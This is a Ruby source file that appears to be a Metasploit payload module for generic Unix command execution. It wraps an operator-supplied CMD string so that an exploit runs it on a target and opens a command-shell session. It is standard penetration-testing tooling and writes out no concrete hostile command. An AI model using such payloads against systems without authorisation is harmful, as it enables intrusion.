require 'msf/core'
require 'msf/core/handler/find_shell'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Cmd
module Unix

module Generic

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command, Generic command execution',
			'Version'       => '$Revision$',
			'Description'   => 'Executes the supplied command',
			'Author'        => 'hdm',
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::FindShell,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))

		register_options(
			[
				OptString.new('CMD', [ true, "The command string to execute" ]),
			], self.class)
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string
		return datastore['CMD'] || ''
	end

end

end end end end end
